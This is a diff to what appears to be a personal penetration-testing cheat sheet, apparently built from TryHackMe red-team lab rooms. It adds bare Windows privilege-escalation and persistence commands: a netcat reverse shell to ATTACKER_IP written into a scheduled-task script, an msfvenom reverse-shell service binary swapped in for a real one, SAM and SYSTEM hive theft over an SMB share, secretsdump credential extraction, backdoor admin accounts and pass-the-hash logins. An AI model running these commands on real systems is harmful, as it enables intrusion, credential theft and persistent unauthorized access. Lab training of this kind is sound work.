@@ -845,6 +845,58 @@ net start
 
 wmic product get name,version,vendor
 
+snmpcheck 10.10.10.10 -c Community
+
+snmpwalk -v1 -c public 10.10.10.10
+
+# Windows Priv #
+
+C:\Unattend.xml / C:\Windows\Panther\Unattend.xml / C:\Windows\Panther\Unattend\Unattend.xml / C:\Windows\system32\sysprep.inf / C:\Windows\system32\sysprep\sysprep.xml
+
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+cmdkey /list / runas /savecred /user:admin cmd.exe
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+schtasks / schtasks /query /tn vulntask /fo list /v / icacls: / icacls c:\tasks\schtask.bat
+
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+sc qc apphostsvc
+
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe / cd C:\PROGRA~2\SYSTEM~1\ / move WService.exe WService.exe.bkp / move C:\Users\thm-unpriv\rev-svc.exe WService.exe / icacls WService.exe /grant Everyone:F
+
+whoami /priv / reg save hklm\system C:\Users\THMBackup\system.hive / reg save hklm\sam C:\Users\THMBackup\sam.hive / mkdir share / python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ / python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL ----> Devamı TryhackMe RedTeam Windows Priv.
+
+# Windows Persis #
+
+net localgroup administrators thmuser0 /add
+
+net localgroup "Backup Operators" thmuser1 /add
+
+net localgroup "Remote Management Users" thmuser1 /add
+
+evil-winrm -i 10.10.110.249 -u thmuser1 -p Password321
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+reg save hklm\system system.bak / reg save hklm\system sam.bak
+
+download system.bak / download sam.bak
+
+python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+
+evil-winrm -i 10.10.110.249 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
+
+
+
 
 
 
